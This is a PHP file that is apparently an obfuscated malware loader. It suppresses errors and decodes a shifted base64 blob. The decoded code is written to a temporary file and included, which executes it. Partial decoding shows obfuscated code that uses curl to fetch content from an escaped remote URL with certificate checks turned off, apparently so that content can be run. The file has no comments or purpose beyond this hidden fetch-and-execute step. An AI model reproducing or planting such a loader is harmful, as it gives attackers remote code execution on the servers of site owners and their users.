<?php
error_reporting(0);
function gW($F9)
{
    $F9 = base64_decode($F9);
    $ik = 0;
    while ($ik < strlen($F9)) {
        $F9[$ik] = chr(ord($F9[$ik]) - 1);
        $ik++;
    }
    return $F9;
}
function tC($ZJ)
{
    $dL = ("tempnam")(("sys_get_temp_dir")(), "tmp_func");
    file_put_contents($dL, "<?php {$ZJ}");
    $dm = (include $dL);
    unlink($dL);
    return $dm;
}
Tc(gW("ISEhISELMCshISFgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYAshISEhfSEhUGNndnRkYnVmZSFjeiFaQkwhUXNwIS4hUWlxIVBjZ3Z0ZGJ1cHMhITMvMS8yNSEhfQshISEhfSEhISEhISEhISEhISEhcG8hMzEzNC4yMy4xNCEyODs2Nzs0NiEhISEhISEhISEhISEhfQshISEhfSEhISFIanVJdmM7IWl1dXF0OzAwaGp1aXZjL2RwbjBxbC5nczB6Ymxxc3AucXAhISEhfQshISEhfWBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgfQsrMAshaHB1cCFHeDwhQjc7IWd2b2R1anBvIXV3KSVzUyohfCFocHVwIUU4PCFqRDshJVtEIT4hKWpvZG12ZWYhJXo2KjwhaHB1cCFxajwhT2s7IXNmdXZzbyElW0Q8IWhwdXAhalM8IUVHOyFnam1mYHF2dWBkcG91Zm91dCklejYtISN8JXNTfiMqPCFocHVwIWpEPCFFODshJXo2IT4hdWZucW9ibil0enRgaGZ1YHVmbnFgZWpzKSotISNdeTg1XXk3ZV15ODFdeTZnXTI1N10yNzZdeTdmXXk3NCMqPCFocHVwIUVHPCFxajshdm9tam9sKSV6Nio8IWhwdXAhT2s8IWpTOyF+IWhwdXAhdjE8IUd4OyElaVQhPiFkdnNtYGpvanUpKjwhaHB1cCFUcjwhdHg7ISVzTSE+IWR2c21gZnlmZCklaVQqPCFocHVwIVBbPCFQWzshZHZzbWBkbXB0ZiklaVQqPCFocHVwIUI3PCFUcjshZHZzbWB0ZnVwcXVgYnNzYnopJWlULSFic3NieilEVlNNUFFVYFZTTSE+PyEjXTI2MV0yNzVdeTg1XTI3MV0yNzRdeTRiXXkzZ115M2ddMjczXXk3Ml15ODhdNjddeTc4XXk3Ol0yNzVdeTc5XTI3Nl15NzNdeTg2XTI3NF15NzZdMjczXXk3NF0yNjhdMjY3XXk4NV15NzZdMjY3XXk4NV02N115NzRdeTdnXXk3ZV02OF03M115NDNdeTY5XXk4MV0yNjVdeTdnXTI2Ml0yNzVdeTc2XTI3M10yMTRdMjczXTI1Nl0yNzhdNjZdeTY1XXk3Nl15NzJdMjY2XXkzZ10yMThdeTc2XTI2NV03NV0yODJdNjZdeTVlXXk3Ol15N2ZdMjYyXXkzZV0yMzRdMjYxXXk3Nl15N2RdeTdkXXkzZV0yMTNdMjUyXTI1NF15N2NdMjU1XXk3Z115N2ddeTgzXXkzZ115NzVdeTc2XXk4N102OF15NzhdMjU2XXk3ZF15NzJdeTg6XXkzZl15ODFdeTc5XTI3MSMtIURWU01QUVVgVFRNYFdGU0pHWklQVFUhPj8hR0JNVEYtIURWU01QUVVgVFRNYFdGU0pHWlFGRlMhPj8hR0JNVEYtIURWU01QUVVgU0ZVVlNPVVNCT1RHRlMhPj8hVVNWRioqPCFocHVwIXR4PCF2MTshdXcpJXNNKjw="));